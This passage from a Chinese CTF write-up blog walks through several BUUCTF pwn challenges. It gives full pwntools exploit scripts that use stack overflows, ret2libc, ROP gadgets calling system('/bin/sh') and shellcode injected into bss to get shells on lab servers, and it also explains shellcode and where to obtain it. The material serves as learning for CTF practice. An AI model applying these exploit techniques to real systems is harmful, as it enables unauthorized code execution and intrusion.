class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = write_addr -0x0f23c0</span></span><br><span class="line"><span class="comment"># system_addr = libc_base + 0x04a470</span></span><br><span class="line"><span class="comment"># str_bin_sh = libc_base + 0x18ee0e</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;aaaaaa&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210721170623513.png" alt="image-20210721170623513"></p>
+<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>蛮怪的一道题，本地打得了换到远程就打不了了</p>
+<p>还是先checksec，发现是32位的，开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210722143949464.png" alt="image-20210722143949464"></p>
+<p>用IDA打开，一眼就看到了后门函数get_flag，但是不急还是先看一眼main函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210722144156731.png" alt="image-20210722144156731"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210722144215644.png" alt="image-20210722144215644"></p>
+<p>很明显可以看出main函数中gets函数存在栈溢出漏洞，get_flag函数中的if语句只要判断a1和a2的值匹配后就会打开flag.txt文件，编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.buuoj.cn&#x27;,29600)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">main_addr=<span class="number">0x08048A20</span></span><br><span class="line">get_flag=<span class="number">0x080489B8</span> <span class="comment">#这里的地址是if条件判断成功后的起始代码地址，可以直接绕过if条件</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> + p32(get_flag) <span class="comment">#0x38=56</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>tips：因为是打开flag.txt，所以本地运行的时候文件夹里应该有个flag.txt文件来判定exp是否正确</strong></p>
+<p>本地能运行但是一跑远程就不行了，所以参考网路上大佬的exp，<strong>利用后门函数</strong></p>
+<p>维护好栈，使得执行完get_flag()后门函数后通过exit()函数正常退出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29600</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">main_addr=<span class="number">0x08048A20</span></span><br><span class="line">get_flag=<span class="number">0x080489A0</span> <span class="comment">#这里的地址是get_flag函数的起始地址</span></span><br><span class="line">fakeebp=<span class="number">0x804E6A0</span> <span class="comment">#exit函数的起始地址</span></span><br><span class="line">a1=<span class="number">0x308CD64F</span></span><br><span class="line">a2=<span class="number">0x195719D1</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> + p32(get_flag)+p32(fakeebp)</span><br><span class="line">payload+=p32(a1)+p32(a2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>还有网路上大佬的思路是<strong>直接获得SHELL</strong></p>
+<h3 id="知识补充环节"><a href="#知识补充环节" class="headerlink" title="知识补充环节"></a>知识补充环节</h3><p>先学习一下mprotect函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>; </span><br><span class="line"></span><br><span class="line">- addr 内存启始地址</span><br><span class="line"></span><br><span class="line">- <span class="type">size_t</span> len: 区段的大小</span><br><span class="line">    </span><br><span class="line">- <span class="type">int</span> prot:区段的权限(可以用<span class="number">8</span>进制来表示)</span><br></pre></td></tr></table></figure>
+
+<p>剩下的思路和exp等我学会了再补充，如果有人来教我一下不胜感激，感谢各位师傅的博客为我打开新世界的大门</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.codenong.com/cs109528155/">https://www.codenong.com/cs109528155/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.cxyzjd.com/article/A951860555/111030289">http://www.cxyzjd.com/article/A951860555/111030289</a></p>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>先checksec，发现只开了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210723111046994.png" alt="image-20210723111046994"></p>
+<p>用IDA打开，发现有_system函数，shift+f12，还发现了&#x2F;bin&#x2F;sh后门，在main函数里发现了</p>
+<p>vulnerable_function()函数，双击进去看到read，可以判断这里存在栈溢出漏洞</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210723111722969.png" alt="image-20210723111722969"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210723111736446.png" alt="image-20210723111736446"></p>
+<p>再查看buf、bin&#x2F;sh和system的地址</p>
+<p>编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29972</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./level2&#x27;)</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0804A024</span></span><br><span class="line">system_addr=<span class="number">0x804845C</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210723122829334.png" alt="image-20210723122829334"></p>
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>这题属实有把我疑惑到，和<strong>ciscn_2019_c_1（ret2libc）</strong>可以说是基本没差，一模一样，不太清楚为什么会这样，具体解法参考上方<strong>ciscn_2019_c_1（ret2libc）</strong></p>
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>妥妥的送分题</p>
+<p>先checksec，发现只开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210724142039857.png" alt="image-20210724142039857"></p>
+<p>用IDA打开文件，一眼就能看见backdoor函数，稍微审计一下main函数，双击一下buf查看地址，记录backdoor的地址</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210724142522148.png" alt="image-20210724142522148"></p>
+<p>这里编写exp的时候犯了个小错误，漏看了__isoc99_scanf(“%d”, &amp;nbytes)，导致编写exp时少了一句一直不能getshell</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28480</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line">backdoor_addr=<span class="number">0x4006E6</span></span><br><span class="line">main_addr=<span class="number">0x4006FB</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor_addr)</span><br><span class="line">p.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>先checksec一下，发现是32位，且只开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726104016851.png" alt="image-20210726104016851"></p>
+<p>用IDA打开文件，发现了main函数<img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726105613550.png" alt="image-20210726105613550"></p>
+<p>Shift+F12发现了一个flag.txt的字符串，随即找到get_secret函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726105927141.png" alt="image-20210726105927141"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726105629413.png" alt="image-20210726105629413"></p>
+<p>找到并记录fl4g的地址</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726110808932.png" alt="image-20210726110808932"></p>
+<p>找到可输出的write函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726111328669.png" alt="image-20210726111328669"></p>
+<p>编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29298</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_secret_addr=<span class="number">0x80489A0</span></span><br><span class="line">flag_addr=<span class="number">0x080ECA2D</span> </span><br><span class="line">main_addr=<span class="number">0x80489E0</span></span><br><span class="line">write_addr = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2d</span>)+p32(get_secret_addr)+p32(write_addr)+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> +p32(<span class="number">1</span>) + p32(flag_addr) + p32(<span class="number">45</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;m3m0...&#x27;)</span></span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726112014907.png" alt="image-20210726112014907"></p>
+<h3 id="知识补充环节-1"><a href="#知识补充环节-1" class="headerlink" title="知识补充环节"></a>知识补充环节</h3><p>exp中：p32(1) + p32(flag_addr) + p32(45) 可参考百度write函数的详解 </p>
+<p><strong>原型：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span>*buf,<span class="type">size_t</span> count)</span>;</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    </span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">      </span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">      </span><br><span class="line">  count：是每次写入的字节数</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>先checksec一下，发现只开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726132933366.png" alt="image-20210726132933366"></p>
+<p>用IDA打开，查看main函数，发现重点是v4和system函数，记录v4的地址长度和system函数的地址</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726133102772.png" alt="image-20210726133102772"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726133127132.png" alt="image-20210726133127132"></p>
+<p>Shift+F12发现了&#x2F;bin&#x2F;sh字符串，记录地址</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726133324268.png" alt="image-20210726133324268"></p>
+<p>&#x2F;bin&#x2F;sh字符串应该放在rdi寄存器里，想到利用pop rdi ret传入字符串并调用system，所以用ROPgadget找一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary babyrop --only &quot;pop|ret&quot;|grep rdi</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726133945682.png" alt="image-20210726133945682"></p>
+<p>编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25800</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line">system_addr=<span class="number">0x400490</span></span><br><span class="line">bin_sh_addr=<span class="number">0x601048</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400683</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ls获得list，发现没有flag但是明显是有权限的，找了半天，最后在home目录下找到了，后来找到了一条命令可以直接找到flag在哪个文件夹下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726134558217.png" alt="image-20210726134558217"></p>
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>和上一题不能说是毫不相干吧，可以说是一模一样，改个地址、改个靶机端口就可以得到flag了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28677</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">system_addr=<span class="number">0x4004C0</span></span><br><span class="line">bin_sh_addr=<span class="number">0x600A90</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726140929544.png" alt="image-20210726140929544"></p>
+<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>先checksec一下，发现啥保护都没开</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726192955239.png" alt="image-20210726192955239"></p>
+<p>用IDA打开，查看main函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726193300274.png" alt="image-20210726193300274"></p>
+<p>第一感觉是read和gets都能利用，就先双击name，发现name在全局变量bss段上 ，因为没开保护，所以想说将shellcode写入bss段上，然后然后利用gets栈溢出rop到bss段上，拿到shell</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726193631922.png"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>) <span class="comment">#设置context</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27197</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh()) <span class="comment">#asm将接受到的字符串转变为汇编码的机器代码,</span></span><br><span class="line">								<span class="comment">#而shellcraft可以生成asm下的shellcode </span></span><br><span class="line">p.recvuntil(<span class="string">&quot;tell me your name&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>) + p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say to me?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210726193817948.png" alt="image-20210726193817948"></p>
+<h3 id="知识补充环节-2"><a href="#知识补充环节-2" class="headerlink" title="知识补充环节"></a>知识补充环节</h3><p><strong>context设置</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>(1)os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>(2)<strong>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’</strong><br>(3) log_level设置日志输出的等级为debug，这句话在调试的时候pwntools会将完整的io过程都打印下来，使得调试更加方便。</p>
+<p><strong>关于shellcode</strong></p>
+<p><strong>什么是shellcode：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">每条汇编指令都对应着长短不一的一串<span class="number">16</span>进制数</span><br><span class="line">这些<span class="number">16</span>进制数串叫做opcode,是和汇编指令存在对应关系的机器码。</span><br><span class="line">或者说可以认为汇编指令是opcode的“别名”。</span><br><span class="line"></span><br><span class="line">易于人类阅读的汇编语言指令，如xor ecx, ecx等，</span><br><span class="line">实际上就是被汇编器根据opcode与汇编指令的替换规则替换成<span class="number">16</span>进制数串，</span><br><span class="line">再与其他数据经过组合处理，</span><br><span class="line">最后变成<span class="number">01</span>字符串被CPU识别并执行的。</span><br><span class="line"></span><br><span class="line">所以我们可以直接构造合法的<span class="number">16</span>进制串组成的opcode串，即shellcode，</span><br><span class="line">使系统得以识别并执行（让CPU执行的shellcode机器码），</span><br><span class="line">完成我们想要的功能。</span><br></pre></td></tr></table></figure>
+
+<p><strong>shellcode为什么能实现”system(“&#x2F;bin&#x2F;sh”)的效果？</strong></p>
+<p>根据别人的实验，一个简单的shellcode运行过程大致如下（不严谨）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EAX, EBX, ECX, EDX四个寄存器被先后清零，</span><br><span class="line">EAX被赋值为<span class="number">0Xb</span>，</span><br><span class="line">ECX入栈，</span><br><span class="line">“/bin<span class="comment">//sh”字符串入栈，</span></span><br><span class="line">并将其首地址赋给了EBX，</span><br><span class="line">最后执行完<span class="type">int</span> <span class="number">80</span>h</span><br></pre></td></tr></table></figure>
+
+<p>这其中实现了“system(“&#x2F;bin&#x2F;sh”)”的效果的地方就是 int 80：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查阅intel开发者手册可以知道<span class="type">int</span>指令的功能是调用系统中断，</span><br><span class="line">所以<span class="type">int</span> <span class="number">80</span>h就是调用<span class="number">128</span>号中断。</span><br><span class="line">在<span class="number">32</span>位的linux系统中，</span><br><span class="line">⭐该中断被用于呼叫系统调用程序system_call().</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。</span><br><span class="line">但是我们显然可以通过调用read(), write()之类的函数从键盘读取输入，把输出保存在硬盘里的文件中。</span><br><span class="line">那么read(), write()之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？</span><br><span class="line">答案就在于<span class="type">int</span> <span class="number">80</span>h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的 指令<span class="type">int</span> <span class="number">80</span>h，就可以通知内核完成不同的功能。</span><br><span class="line">而read(), write(), system()之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。<span class="number">32</span>位linux系统的内核一共提供了<span class="number">0</span>~<span class="number">337</span>号共计<span class="number">338</span>种系统调用用以实现不同的功能。</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取shellcode</strong></p>
+<p><strong>1.直接获取</strong></p>
+<p>网络上有许多已经编写好的shellcode资源公开分享</p>
+<p>诸如：</p>
+<p>exploit database；</p>
+<p>Shellcodes database for study cases（该平台目前已停止更新）</p>
+<p><strong>2.通过软件获取shellcode</strong></p>
+<p>eg：cobaltstrike(win)</p>
+<p>msf(功能强大，以后研究)</p>
+<p>pwntools(用其核心模块shellcraft生成shellcode)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwntools库获取shellcode标准写法：</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置目标机器信息</span></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#asm将接受到的字符串转变为汇编码的机器代码,而shellcraft可以生成asm下的shellcode</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.amd64.linux.sh)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br></pre></td></tr></table></figure>
+
+
+
